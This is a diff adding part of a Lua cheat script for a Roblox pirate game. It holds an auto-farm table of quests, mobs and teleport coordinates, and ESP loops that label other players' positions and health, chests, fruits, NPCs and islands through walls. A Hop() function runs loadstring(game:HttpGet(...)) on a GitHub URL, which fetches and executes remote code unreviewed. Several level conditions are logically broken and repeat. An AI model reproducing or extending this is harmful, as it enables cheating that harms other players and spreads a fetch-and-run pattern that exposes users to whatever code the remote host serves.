+            NameMon = "Ice Cream Chef";
+            CFrameQuest = CFrame.new(-820.64825439453, 65.819526672363, -10965.795898438, 0, 0, -1, 0, 1, 0, 1, 0, 0);
+            CFrameMon = CFrame.new(-872.24658203125, 65.81957244873047, -10919.95703125);
+        elseif MyLevel == 2150 or MyLevel <= 2199 then
+            Mon = "Ice Cream Commander";
+            LevelQuest = 2;
+            NameQuest = "IceCreamIslandQuest";
+            NameMon = "Ice Cream Commander";
+            CFrameQuest = CFrame.new(-820.64825439453, 65.819526672363, -10965.795898438, 0, 0, -1, 0, 1, 0, 1, 0, 0);
+            CFrameMon = CFrame.new(-558.06103515625, 112.04895782470703, -11290.7744140625);
+        elseif MyLevel == 2200 or MyLevel <= 2224 then
+            Mon = "Cookie Crafter";
+            LevelQuest = 1;
+            NameQuest = "CakeQuest1";
+            NameMon = "Cookie Crafter";
+            CFrameQuest = CFrame.new(-2021.32007, 37.7982254, -12028.7295, 0.957576931, -0.0000000880302053,
+                0.288177818, 0.000000069301187, 1, 0.0000000751931211, -0.288177818, -0.000000052032135, 0.957576931);
+            CFrameMon = CFrame.new(-2374.13671875, 37.79826354980469, -12125.30859375);
+        elseif MyLevel == 2225 or MyLevel <= 2249 then
+            Mon = "Cake Guard";
+            LevelQuest = 2;
+            NameQuest = "CakeQuest1";
+            NameMon = "Cake Guard";
+            CFrameQuest = CFrame.new(-2021.32007, 37.7982254, -12028.7295, 0.957576931, -0.0000000880302053,
+                0.288177818, 0.000000069301187, 1, 0.0000000751931211, -0.288177818, -0.000000052032135, 0.957576931);
+            CFrameMon = CFrame.new(-1598.3070068359375, 43.773197174072266, -12244.5810546875);
+        elseif MyLevel == 2250 or MyLevel <= 2274 then
+            Mon = "Baking Staff";
+            LevelQuest = 1;
+            NameQuest = "CakeQuest2";
+            NameMon = "Baking Staff";
+            CFrameQuest = CFrame.new(-1927.91602, 37.7981339, -12842.5391, -0.96804446, 0.0000000422142143, 0.250778586,
+                0.0000000474911062, 1, 0.0000000149904711, -0.250778586, 0.0000000264211941, -0.96804446);
+            CFrameMon = CFrame.new(-1887.8099365234375, 77.6185073852539, -12998.3505859375);
+        elseif MyLevel == 2275 or MyLevel <= 2299 then
+            Mon = "Head Baker";
+            LevelQuest = 2;
+            NameQuest = "CakeQuest2";
+            NameMon = "Head Baker";
+            CFrameQuest = CFrame.new(-1927.91602, 37.7981339, -12842.5391, -0.96804446, 0.0000000422142143, 0.250778586,
+                0.0000000474911062, 1, 0.0000000149904711, -0.250778586, 0.0000000264211941, -0.96804446);
+            CFrameMon = CFrame.new(-2216.188232421875, 82.884521484375, -12869.2939453125);
+        elseif MyLevel == 2300 or MyLevel <= 2324 then
+            Mon = "Cocoa Warrior";
+            LevelQuest = 1;
+            NameQuest = "ChocQuest1";
+            NameMon = "Cocoa Warrior";
+            CFrameQuest = CFrame.new(233.22836303710938, 29.876001358032227, -12201.2333984375);
+            CFrameMon = CFrame.new(-21.55328369140625, 80.57499694824219, -12352.3876953125);
+        elseif MyLevel == 2325 or MyLevel <= 2349 then
+            Mon = "Chocolate Bar Battler";
+            LevelQuest = 2;
+            NameQuest = "ChocQuest1";
+            NameMon = "Chocolate Bar Battler";
+            CFrameQuest = CFrame.new(233.22836303710938, 29.876001358032227, -12201.2333984375);
+            CFrameMon = CFrame.new(582.590576171875, 77.18809509277344, -12463.162109375);
+        elseif MyLevel == 2350 or MyLevel <= 2374 then
+            Mon = "Sweet Thief";
+            LevelQuest = 1;
+            NameQuest = "ChocQuest2";
+            NameMon = "Sweet Thief";
+            CFrameQuest = CFrame.new(150.5066375732422, 30.693693161010742, -12774.5029296875);
+            CFrameMon = CFrame.new(165.1884765625, 76.05885314941406, -12600.8369140625);
+        elseif MyLevel == 2375 or MyLevel <= 2399 then
+            Mon = "Candy Rebel";
+            LevelQuest = 2;
+            NameQuest = "ChocQuest2";
+            NameMon = "Candy Rebel";
+            CFrameQuest = CFrame.new(150.5066375732422, 30.693693161010742, -12774.5029296875);
+            CFrameMon = CFrame.new(134.86563110351562, 77.2476806640625, -12876.5478515625);
+        elseif MyLevel == 2400 or MyLevel <= 2424 then
+            Mon = "Candy Pirate";
+            LevelQuest = 1;
+            NameQuest = "CandyQuest1";
+            NameMon = "Candy Pirate";
+            CFrameQuest = CFrame.new(-1150.0400390625, 20.378934860229492, -14446.3349609375);
+            CFrameMon = CFrame.new(-1310.5003662109375, 26.016523361206055, -14562.404296875);
+        elseif MyLevel == 2425 or MyLevel <= 2449 then
+            Mon = "Snow Demon";
+            LevelQuest = 2;
+            NameQuest = "CandyQuest1";
+            NameMon = "Snow Demon";
+            CFrameQuest = CFrame.new(-1150.0400390625, 20.378934860229492, -14446.3349609375);
+            CFrameMon = CFrame.new(-880.2006225585938, 71.24776458740234, -14538.609375);
+        elseif MyLevel == 2450 or MyLevel <= 2474 then
+            Mon = "Isle Outlaw";
+            LevelQuest = 1;
+            NameQuest = "TikiQuest1";
+            NameMon = "Isle Outlaw";
+            CFrameQuest = CFrame.new(-16547.748046875, 61.13533401489258, -173.41360473632812);
+            CFrameMon = CFrame.new(-16442.814453125, 116.13899993896484, -264.4637756347656);
+        elseif MyLevel == 2475 or MyLevel <= 2524 then
+            Mon = "Island Boy";
+            LevelQuest = 2;
+            NameQuest = "TikiQuest1";
+            NameMon = "Island Boy";
+            CFrameQuest = CFrame.new(-16547.748046875, 61.13533401489258, -173.41360473632812);
+            CFrameMon = CFrame.new(-16901.26171875, 84.06756591796875, -192.88906860351562);
+        elseif MyLevel == 2525 or MyLevel <= 2549 then
+            Mon = "Isle Champion";
+            LevelQuest = 2;
+            NameQuest = "TikiQuest2";
+            NameMon = "Isle Champion";
+            CFrameQuest = CFrame.new(-16539.078125, 55.68632888793945, 1051.5738525390625);
+            CFrameMon = CFrame.new(-16641.6796875, 235.7825469970703, 1031.282958984375);
+        elseif MyLevel == 2550 or MyLevel <= 2574 then
+            Mon = "Serpent Hunter";
+            LevelQuest = 1;
+            NameQuest = "TikiQuest3";
+            NameMon = "Serpent Hunter";
+            CFrameQuest = CFrame.new(-16661.890625, 105.2862319946289, 1576.69775390625);
+            CFrameMon = CFrame.new(-16587.896484375, 154.21299743652344, 1533.40966796875);
+        elseif MyLevel == 2575 or MyLevel >= 2600 then
+            Mon = "Skull Slayer";
+            LevelQuest = 2;
+            NameQuest = "TikiQuest3";
+            NameMon = "Skull Slayer";
+            CFrameQuest = CFrame.new(-16661.890625, 105.2862319946289, 1576.69775390625);
+            CFrameMon = CFrame.new(-16885.203125, 114.12911224365234, 1627.949951171875);
+        elseif MyLevel == 2600 or MyLevel >= 2624 then
+            Mon = "Skull Slayer";
+            LevelQuest = 2;
+            NameQuest = "TikiQuest3";
+            NameMon = "Skull Slayer";
+            CFrameQuest = CFrame.new(-16661.890625, 105.2862319946289, 1576.69775390625);
+            CFrameMon = CFrame.new(-16885.203125, 114.12911224365234, 1627.949951171875);
+        elseif MyLevel == 2625 or MyLevel >= 2649 then
+            Mon = "Skull Slayer";
+            LevelQuest = 2;
+            NameQuest = "TikiQuest3";
+            NameMon = "Skull Slayer";
+            CFrameQuest = CFrame.new(-16661.890625, 105.2862319946289, 1576.69775390625);
+            CFrameMon = CFrame.new(-16885.203125, 114.12911224365234, 1627.949951171875);
+        elseif MyLevel == 2650 or MyLevel >= 2750 then
+            Mon = "Skull Slayer";
+            LevelQuest = 2;
+            NameQuest = "TikiQuest3";
+            NameMon = "Skull Slayer";
+            CFrameQuest = CFrame.new(-16661.890625, 105.2862319946289, 1576.69775390625);
+            CFrameMon = CFrame.new(-16885.203125, 114.12911224365234, 1627.949951171875);
+        end
+    end
+end
+function Hop()
+    local module = (loadstring(game:HttpGet(
+        "https://raw.githubusercontent.com/raw-scriptpastebin/FE/main/Server_Hop_Settings")))();
+    module:Teleport(game.PlaceId);
+end
+function isnil(thing)
+    return thing == nil;
+end
+local function round(n)
+    return math.floor(tonumber(n) + 0.5);
+end
+Number = math.random(1, 1000000);
+spawn(function()
+    while wait(1) do
+        for i, v in pairs((game:GetService("Workspace"))._WorldOrigin.Locations:GetChildren()) do
+            pcall(function()
+                if _G.Settings.Esp["ESP Island"] then
+                    if v.Name ~= "Sea" then
+                        if not v:FindFirstChild("EspIsland") then
+                            local bill = Instance.new("BillboardGui", v);
+                            bill.Name = "EspIsland";
+                            bill.ExtentsOffset = Vector3.new(0, 1, 0);
+                            bill.Size = UDim2.new(0, 200, 0, 30);
+                            bill.Adornee = v;
+                            bill.AlwaysOnTop = true;
+                            local name = Instance.new("TextLabel", bill);
+                            name.Font = Enum.Font.GothamMedium;
+                            name.TextSize = 14;
+                            name.TextWrapped = true;
+                            name.Size = UDim2.new(1, 0, 1, 0);
+                            name.TextYAlignment = Enum.TextYAlignment.Top;
+                            name.BackgroundTransparency = 1;
+                            name.TextColor3 = Color3.fromRGB(255, 255, 255);
+                        else
+                            v.EspIsland.TextLabel.Text = v.Name .. "   \n" ..
+                                                             round(
+                                    (((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude /
+                                        3) .. " Distance";
+                        end
+                    end
+                elseif v:FindFirstChild("EspIsland") then
+                    (v:FindFirstChild("EspIsland")):Destroy();
+                end
+            end);
+        end
+    end
+end);
+spawn(function()
+    while wait(1) do
+        for i, v in pairs((game:GetService("Players")):GetChildren()) do
+            pcall(function()
+                if not isnil(v.Character) then
+                    if _G.Settings.Esp["ESP Player"] then
+                        if not v.Character.Head:FindFirstChild(("EspPlayer" .. Number)) then
+                            local bill = Instance.new("BillboardGui", v.Character.Head);
+                            bill.Name = "EspPlayer" .. Number;
+                            bill.ExtentsOffset = Vector3.new(0, 1, 0);
+                            bill.Size = UDim2.new(1, 200, 1, 30);
+                            bill.Adornee = v.Character.Head;
+                            bill.AlwaysOnTop = true;
+                            local name = Instance.new("TextLabel", bill);
+                            name.Font = Enum.Font.GothamSemibold;
+                            name.FontSize = "Size14";
+                            name.TextWrapped = true;
+                            name.Text = v.Name .. " \n" ..
+                                            round(
+                                    (((game:GetService("Players")).LocalPlayer.Character.Head.Position -
+                                        v.Character.Head.Position)).Magnitude / 3) .. " Distance";
+                            name.Size = UDim2.new(1, 0, 1, 0);
+                            name.TextYAlignment = "Top";
+                            name.BackgroundTransparency = 1;
+                            name.TextStrokeTransparency = 0.5;
+                            if v.Team == game.Players.LocalPlayer.Team then
+                                name.TextColor3 = Color3.fromRGB(50, 200, 50);
+                            else
+                                name.TextColor3 = Color3.fromRGB(200, 50, 50);
+                            end
+                        else
+                            v.Character.Head["EspPlayer" .. Number].TextLabel.Text = v.Name .. " | " ..
+                                                                                         round(
+                                    (((game:GetService("Players")).LocalPlayer.Character.Head.Position -
+                                        v.Character.Head.Position)).Magnitude / 3) .. " Distance\nHealth : " ..
+                                                                                         round(
+                                    v.Character.Humanoid.Health * 100 / v.Character.Humanoid.MaxHealth) .. "%";
+                        end
+                    elseif v.Character.Head:FindFirstChild("EspPlayer" .. Number) then
+                        (v.Character.Head:FindFirstChild("EspPlayer" .. Number)):Destroy();
+                    end
+                end
+            end);
+        end
+    end
+end);
+spawn(function()
+    while wait(1) do
+        for i, v in pairs(game.Workspace.ChestModels:GetChildren()) do
+            pcall(function()
+                if string.find(v.Name, "Chest") then
+                    if _G.Settings.Esp["ESP Chest"] then
+                        if string.find(v.Name, "Chest") then
+                            if not v:FindFirstChild(("EspChest" .. Number)) then
+                                local bill = Instance.new("BillboardGui", v);
+                                bill.Name = "EspChest" .. Number;
+                                bill.ExtentsOffset = Vector3.new(0, 1, 0);
+                                bill.Size = UDim2.new(1, 200, 1, 30);
+                                bill.Adornee = v;
+                                bill.AlwaysOnTop = true;
+                                local name = Instance.new("TextLabel", bill);
+                                name.Font = Enum.Font.Nunito;
+                                name.FontSize = "Size14";
+                                name.TextWrapped = true;
+                                name.Size = UDim2.new(1, 0, 1, 0);
+                                name.TextYAlignment = "Top";
+                                name.BackgroundTransparency = 1;
+                                name.TextStrokeTransparency = 0.5;
+                                if v.Name == "SilverChest" then
+                                    name.TextColor3 = Color3.fromRGB(109, 109, 109);
+                                    name.Text = "Silver Chest" .. " \n" ..
+                                                    round(
+                                            (((game:GetService("Players")).LocalPlayer.Character.Head.Position -
+                                                v.RootPart.Position)).Magnitude / 3) .. " Distance";
+                                end
+                                if v.Name == "GoldChest" then
+                                    name.TextColor3 = Color3.fromRGB(173, 158, 21);
+                                    name.Text = "Gold Chest" .. " \n" ..
+                                                    round(
+                                            (((game:GetService("Players")).LocalPlayer.Character.Head.Position -
+                                                v.RootPart.Position)).Magnitude / 3) .. " Distance";
+                                end
+                                if v.Name == "DiamondChest" then
+                                    name.TextColor3 = Color3.fromRGB(20, 200, 200);
+                                    name.Text = "Diamond Chest" .. " \n" ..
+                                                    round(
+                                            (((game:GetService("Players")).LocalPlayer.Character.Head.Position -
+                                                v.RootPart.Position)).Magnitude / 3) .. " Distance";
+                                end
+                            else
+                                v["EspChest" .. Number].TextLabel.Text = v.Name .. "   \n" ..
+                                                                             round(
+                                        (((game:GetService("Players")).LocalPlayer.Character.Head.Position -
+                                            v.RootPart.Position)).Magnitude / 3) .. " Distance";
+                            end
+                        end
+                    elseif v:FindFirstChild("EspChest" .. Number) then
+                        (v:FindFirstChild("EspChest" .. Number)):Destroy();
+                    end
+                end
+            end);
+        end
+    end
+end);
+spawn(function()
+    while wait(1) do
+        for i, v in pairs(game.Workspace:GetChildren()) do
+            pcall(function()
+                if _G.Settings.Esp["ESP DevilFruit"] then
+                    if v.Name and string.find(v.Name, "Fruit") then
+                        if not v.Handle:FindFirstChild(("EspDevilFruit" .. Number)) then
+                            local bill = Instance.new("BillboardGui", v.Handle);
+                            bill.Name = "EspDevilFruit" .. Number;
+                            bill.ExtentsOffset = Vector3.new(0, 1, 0);
+                            bill.Size = UDim2.new(1, 200, 1, 30);
+                            bill.Adornee = v.Handle;
+                            bill.AlwaysOnTop = true;
+                            local name = Instance.new("TextLabel", bill);
+                            name.Font = Enum.Font.GothamSemibold;
+                            name.FontSize = "Size14";
+                            name.TextWrapped = true;
+                            name.Size = UDim2.new(1, 0, 1, 0);
+                            name.TextYAlignment = "Top";
+                            name.BackgroundTransparency = 1;
+                            name.TextStrokeTransparency = 0.5;
+                            name.TextColor3 = Color3.fromRGB(255, 255, 255);
+                            name.Text = v.Name .. " \n" ..
+                                            round(
+                                    (((game:GetService("Players")).LocalPlayer.Character.Head.Position -
+                                        v.Handle.Position)).Magnitude / 3) .. " Distance";
+                            local TweenService = game:GetService("TweenService");
+                            local rainbowColors = {Color3.fromRGB(255, 0, 0), Color3.fromRGB(255, 127, 0),
+                                                   Color3.fromRGB(255, 255, 0), Color3.fromRGB(0, 255, 0),
+                                                   Color3.fromRGB(0, 0, 255), Color3.fromRGB(75, 0, 130),
+                                                   Color3.fromRGB(148, 0, 211)};
+                            local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut);
+                            (coroutine.wrap(function()
+                                while true do
+                                    for _, color in ipairs(rainbowColors) do
+                                        local tween = TweenService:Create(name, tweenInfo, {
+                                            TextColor3 = color
+                                        });
+                                        tween:Play();
+                                        tween.Completed:Wait();
+                                    end
+                                end
+                            end))();
+                        else
+                            v.Handle["EspDevilFruit" .. Number].TextLabel.Text = v.Name .. " \n" ..
+                                                                                     round(
+                                    (((game:GetService("Players")).LocalPlayer.Character.Head.Position -
+                                        v.Handle.Position)).Magnitude / 3) .. " Distance";
+                        end
+                    end
+                elseif v.Handle:FindFirstChild("EspDevilFruit" .. Number) then
+                    (v.Handle:FindFirstChild("EspDevilFruit" .. Number)):Destroy();
+                end
+            end);
+        end
+    end
+end);
+spawn(function()
+    while wait(0) do
+        for i, v in pairs(game.Workspace._WorldOrigin:GetChildren()) do
+            pcall(function()
+                if _G.Settings.Esp["ESP DevilFruit"] then
+                    if string.find(v.Name, "Fruit") then
+                        if not v.Handle:FindFirstChild(("EspDevilFruit" .. Number)) then
+                            local bill = Instance.new("BillboardGui", v.Handle);
+                            bill.Name = "EspDevilFruit" .. Number;
+                            bill.ExtentsOffset = Vector3.new(0, 1, 0);
+                            bill.Size = UDim2.new(1, 200, 1, 30);
+                            bill.Adornee = v.Handle;
+                            bill.AlwaysOnTop = true;
+                            local name = Instance.new("TextLabel", bill);
+                            name.Font = Enum.Font.GothamSemibold;
+                            name.FontSize = "Size14";
+                            name.TextWrapped = true;
+                            name.Size = UDim2.new(1, 0, 1, 0);
+                            name.TextYAlignment = "Top";
+                            name.BackgroundTransparency = 1;
+                            name.TextStrokeTransparency = 0.5;
+                            name.TextColor3 = Color3.fromRGB(255, 255, 255);
+                            name.Text = v.Name .. "(SPAWNED)" .. " \n" ..
+                                            round(
+                                    (((game:GetService("Players")).LocalPlayer.Character.Head.Position -
+                                        v.Handle.Position)).Magnitude / 3) .. " Distance";
+                            local TweenService = game:GetService("TweenService");
+                            local rainbowColors = {Color3.fromRGB(255, 0, 0), Color3.fromRGB(255, 127, 0),
+                                                   Color3.fromRGB(255, 255, 0), Color3.fromRGB(0, 255, 0),
+                                                   Color3.fromRGB(0, 0, 255), Color3.fromRGB(75, 0, 130),
+                                                   Color3.fromRGB(148, 0, 211)};
+                            local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut);
+                            (coroutine.wrap(function()
+                                while true do
+                                    for _, color in ipairs(rainbowColors) do
+                                        local tween = TweenService:Create(name, tweenInfo, {
+                                            TextColor3 = color
+                                        });
+                                        tween:Play();
+                                        tween.Completed:Wait();
+                                    end
+                                end
+                            end))();
+                        else
+                            v.Handle["EspDevilFruit" .. Number].TextLabel.Text = v.Name .. " \n" ..
+                                                                                     round(
+                                    (((game:GetService("Players")).LocalPlayer.Character.Head.Position -
+                                        v.Handle.Position)).Magnitude / 3) .. " Distance";
+                        end
+                    end
+                elseif v.Handle:FindFirstChild("EspDevilFruit" .. Number) then
+                    (v.Handle:FindFirstChild("EspDevilFruit" .. Number)):Destroy();
+                end
+            end);
+        end
+    end
+end);
+spawn(function()
+    while wait(1) do
+        for i, v in pairs(game.Workspace:GetChildren()) do
+            pcall(function()
+                if v.Name == "Flower2" or v.Name == "Flower1" then
+                    if _G.Settings.Esp["ESP Flower"] then
+                        if not v:FindFirstChild(("EspFlower" .. Number)) then
+                            local bill = Instance.new("BillboardGui", v);
+                            bill.Name = "EspFlower" .. Number;
+                            bill.ExtentsOffset = Vector3.new(0, 1, 0);
+                            bill.Size = UDim2.new(1, 200, 1, 30);
+                            bill.Adornee = v;
+                            bill.AlwaysOnTop = true;
+                            local name = Instance.new("TextLabel", bill);
+                            name.Font = Enum.Font.GothamSemibold;
+                            name.FontSize = "Size14";
+                            name.TextWrapped = true;
+                            name.Size = UDim2.new(1, 0, 1, 0);
+                            name.TextYAlignment = "Top";
+                            name.BackgroundTransparency = 1;
+                            name.TextStrokeTransparency = 0.5;
+                            name.TextColor3 = Color3.fromRGB(255, 100, 100);
+                            if v.Name == "Flower1" then
+                                name.Text = "Blue Flower" .. " \n" ..
+                                                round(
+                                        (((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude /
+                                            3) .. " Distance";
+                                name.TextColor3 = Color3.fromRGB(40, 40, 255);
+                            end
+                            if v.Name == "Flower2" then
+                                name.Text = "Red Flower" .. " \n" ..
+                                                round(
+                                        (((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude /
+                                            3) .. " Distance";
+                                name.TextColor3 = Color3.fromRGB(255, 100, 100);
+                            end
+                        else
+                            v["EspFlower" .. Number].TextLabel.Text = v.Name .. "   \n" ..
+                                                                          round(
+                                    (((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude /
+                                        3) .. " Distance";
+                        end
+                    elseif v:FindFirstChild("EspFlower" .. Number) then
+                        (v:FindFirstChild("EspFlower" .. Number)):Destroy();
+                    end
+                end
+            end);
+        end
+    end
+end);
+spawn(function()
+    while wait(1) do
+        for i, v in pairs(game.Workspace.AppleSpawner:GetChildren()) do
+            if v:IsA("Tool") then
+                if _G.Settings.Esp["ESP RealFruit"] then
+                    if not v.Handle:FindFirstChild(("EspRealFruit" .. Number)) then
+                        local bill = Instance.new("BillboardGui", v.Handle);
+                        bill.Name = "EspRealFruit" .. Number;
+                        bill.ExtentsOffset = Vector3.new(0, 1, 0);
+                        bill.Size = UDim2.new(1, 200, 1, 30);
+                        bill.Adornee = v.Handle;
+                        bill.AlwaysOnTop = true;
+                        local name = Instance.new("TextLabel", bill);
+                        name.Font = Enum.Font.GothamSemibold;
+                        name.FontSize = "Size14";
+                        name.TextWrapped = true;
+                        name.Size = UDim2.new(1, 0, 1, 0);
+                        name.TextYAlignment = "Top";
+                        name.BackgroundTransparency = 1;
+                        name.TextStrokeTransparency = 0.5;
+                        name.TextColor3 = Color3.fromRGB(200, 70, 70);
+                        name.Text = v.Name .. " \n" ..
+                                        round(
+                                (((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Handle.Position)).Magnitude /
+                                    3) .. " Distance";
+                    else
+                        v.Handle["EspRealFruit" .. Number].TextLabel.Text = v.Name .. " " ..
+                                                                                round(
+                                (((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Handle.Position)).Magnitude /
+                                    3) .. " Distance";
+                    end
+                elseif v.Handle:FindFirstChild("EspRealFruit" .. Number) then
+                    (v.Handle:FindFirstChild("EspRealFruit" .. Number)):Destroy();
+                end
+            end
+        end
+        for i, v in pairs(game.Workspace.PineappleSpawner:GetChildren()) do
+            if v:IsA("Tool") then
+                if _G.Settings.Esp["ESP RealFruit"] then
+                    if not v.Handle:FindFirstChild(("EspRealFruit" .. Number)) then
+                        local bill = Instance.new("BillboardGui", v.Handle);
+                        bill.Name = "EspRealFruit" .. Number;
+                        bill.ExtentsOffset = Vector3.new(0, 1, 0);
+                        bill.Size = UDim2.new(1, 200, 1, 30);
+                        bill.Adornee = v.Handle;
+                        bill.AlwaysOnTop = true;
+                        local name = Instance.new("TextLabel", bill);
+                        name.Font = Enum.Font.GothamSemibold;
+                        name.FontSize = "Size14";
+                        name.TextWrapped = true;
+                        name.Size = UDim2.new(1, 0, 1, 0);
+                        name.TextYAlignment = "Top";
+                        name.BackgroundTransparency = 1;
+                        name.TextStrokeTransparency = 0.5;
+                        name.TextColor3 = Color3.fromRGB(255, 170, 0);
+                        name.Text = v.Name .. " \n" ..
+                                        round(
+                                (((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Handle.Position)).Magnitude /
+                                    3) .. " Distance";
+                    else
+                        v.Handle["EspRealFruit" .. Number].TextLabel.Text = v.Name .. " " ..
+                                                                                round(
+                                (((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Handle.Position)).Magnitude /
+                                    3) .. " Distance";
+                    end
+                elseif v.Handle:FindFirstChild("EspRealFruit" .. Number) then
+                    (v.Handle:FindFirstChild("EspRealFruit" .. Number)):Destroy();
+                end
+            end
+        end
+        for i, v in pairs(game.Workspace.BananaSpawner:GetChildren()) do
+            if v:IsA("Tool") then
+                if _G.Settings.Esp["ESP RealFruit"] then
+                    if not v.Handle:FindFirstChild(("EspRealFruit" .. Number)) then
+                        local bill = Instance.new("BillboardGui", v.Handle);
+                        bill.Name = "EspRealFruit" .. Number;
+                        bill.ExtentsOffset = Vector3.new(0, 1, 0);
+                        bill.Size = UDim2.new(1, 200, 1, 30);
+                        bill.Adornee = v.Handle;
+                        bill.AlwaysOnTop = true;
+                        local name = Instance.new("TextLabel", bill);
+                        name.Font = Enum.Font.GothamSemibold;
+                        name.FontSize = "Size14";
+                        name.TextWrapped = true;
+                        name.Size = UDim2.new(1, 0, 1, 0);
+                        name.TextYAlignment = "Top";
+                        name.BackgroundTransparency = 1;
+                        name.TextStrokeTransparency = 0.5;
+                        name.TextColor3 = Color3.fromRGB(240, 255, 10);
+                        name.Text = v.Name .. " \n" ..
+                                        round(
+                                (((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Handle.Position)).Magnitude /
+                                    3) .. " Distance";
+                    else
+                        v.Handle["EspRealFruit" .. Number].TextLabel.Text = v.Name .. " " ..
+                                                                                round(
+                                (((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Handle.Position)).Magnitude /
+                                    3) .. " Distance";
+                    end
+                elseif v.Handle:FindFirstChild("EspRealFruit" .. Number) then
+                    (v.Handle:FindFirstChild("EspRealFruit" .. Number)):Destroy();
+                end
+            end
+        end
+    end
+end);
+spawn(function()
+    while wait(1) do
+        pcall(function()
+            if _G.Settings.Esp["ESP Monster"] then
+                for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                    if v:FindFirstChild("HumanoidRootPart") then
+                        if not v:FindFirstChild("EspMonster") then
+                            local BillboardGui = Instance.new("BillboardGui");
+                            local TextLabel = Instance.new("TextLabel");
+                            BillboardGui.Parent = v;
+                            BillboardGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
+                            BillboardGui.Active = true;
+                            BillboardGui.Name = "EspMonster";
+                            BillboardGui.AlwaysOnTop = true;
+                            BillboardGui.LightInfluence = 1;
+                            BillboardGui.Size = UDim2.new(0, 200, 0, 50);
+                            BillboardGui.StudsOffset = Vector3.new(0, 2.5, 0);
+                            TextLabel.Parent = BillboardGui;
+                            TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
+                            TextLabel.BackgroundTransparency = 1;
+                            TextLabel.Size = UDim2.new(0, 200, 0, 50);
+                            TextLabel.Font = Enum.Font.GothamBold;
+                            TextLabel.TextColor3 = Color3.fromRGB(120, 130, 230);
+                            TextLabel.Text.Size = 35;
+                        end
+                        local Dis = math.floor((game.Players.LocalPlayer.Character.HumanoidRootPart.Position -
+                                                   v.HumanoidRootPart.Position).Magnitude);
+                        v.EspMonster.TextLabel.Text = v.Name .. " - " .. Dis .. " Distance";
+                    end
+                end
+            else
+                for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                    if v:FindFirstChild("EspMonster") then
+                        v.EspMonster:Destroy();
+                    end
+                end
+            end
+        end);
+    end
+end);
+spawn(function()
+    while wait(1) do
+        pcall(function()
+            if _G.Settings.Esp["ESP Sea Beast"] then
+                for i, v in pairs((game:GetService("Workspace")).SeaBeasts:GetChildren()) do
+                    if v:FindFirstChild("HumanoidRootPart") then
+                        if not v:FindFirstChild("EspSeabeasts") then
+                            local BillboardGui = Instance.new("BillboardGui");
+                            local TextLabel = Instance.new("TextLabel");
+                            BillboardGui.Parent = v;
+                            BillboardGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
+                            BillboardGui.Active = true;
+                            BillboardGui.Name = "EspSeabeasts";
+                            BillboardGui.AlwaysOnTop = true;
+                            BillboardGui.LightInfluence = 1;
+                            BillboardGui.Size = UDim2.new(0, 200, 0, 50);
+                            BillboardGui.StudsOffset = Vector3.new(0, 2.5, 0);
+                            TextLabel.Parent = BillboardGui;
+                            TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
+                            TextLabel.BackgroundTransparency = 1;
+                            TextLabel.Size = UDim2.new(0, 200, 0, 50);
+                            TextLabel.Font = Enum.Font.Gotham;
+                            TextLabel.TextColor3 = Color3.fromRGB(60, 240, 120);
+                            TextLabel.Text.Size = 35;
+                        end
+                        local Dis = math.floor((game.Players.LocalPlayer.Character.HumanoidRootPart.Position -
+                                                   v.HumanoidRootPart.Position).Magnitude);
+                        v.EspSeabeasts.TextLabel.Text = v.Name .. " - " .. Dis .. " Distance";
+                    end
+                end
+            else
+                for i, v in pairs((game:GetService("Workspace")).SeaBeasts:GetChildren()) do
+                    if v:FindFirstChild("EspSeabeasts") then
+                        v.EspSeabeasts:Destroy();
+                    end
+                end
+            end
+        end);
+    end
+end);
+spawn(function()
+    while wait(1) do
+        pcall(function()
+            if _G.Settings.Esp["ESP Npc"] then
+                for i, v in pairs((game:GetService("Workspace")).NPCs:GetChildren()) do
+                    if v:FindFirstChild("HumanoidRootPart") then
+                        if not v:FindFirstChild("EspNpc") then
+                            local BillboardGui = Instance.new("BillboardGui");
+                            local TextLabel = Instance.new("TextLabel");
+                            BillboardGui.Parent = v;
+                            BillboardGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
+                            BillboardGui.Active = true;
+                            BillboardGui.Name = "EspNpc";
+                            BillboardGui.AlwaysOnTop = true;
+                            BillboardGui.LightInfluence = 1;
+                            BillboardGui.Size = UDim2.new(0, 200, 0, 50);
+                            BillboardGui.StudsOffset = Vector3.new(0, 2.5, 0);
+                            TextLabel.Parent = BillboardGui;
+                            TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
+                            TextLabel.BackgroundTransparency = 1;
+                            TextLabel.Size = UDim2.new(0, 200, 0, 50);
+                            TextLabel.Font = Enum.Font.Cartoon;
+                            TextLabel.TextColor3 = Color3.fromRGB(200, 60, 120);
+                            TextLabel.Text.Size = 45;
+                        end
+                        local Dis = math.floor((game.Players.LocalPlayer.Character.HumanoidRootPart.Position -
+                                                   v.HumanoidRootPart.Position).Magnitude);
+                        v.EspNpc.TextLabel.Text = v.Name .. " - " .. Dis .. " Distance";
+                    end
+                end
+            else
+                for i, v in pairs((game:GetService("Workspace")).NPCs:GetChildren()) do
+                    if v:FindFirstChild("EspNpc") then
+                        v.EspNpc:Destroy();
+                    end
+                end
+            end
+        end);
+    end
+end);
+spawn(function()
+    while wait(1) do
+        for i, v in pairs((game:GetService("Workspace"))._WorldOrigin.Locations:GetChildren()) do
+            pcall(function()
+                if _G.Settings.Esp["ESP Mirage"] then
+                    if v.Name == "Mirage Island" then
+                        if not v:FindFirstChild("EspMirageIsland") then
+                            local bill = Instance.new("BillboardGui", v);
+                            bill.Name = "EspMirageIsland";
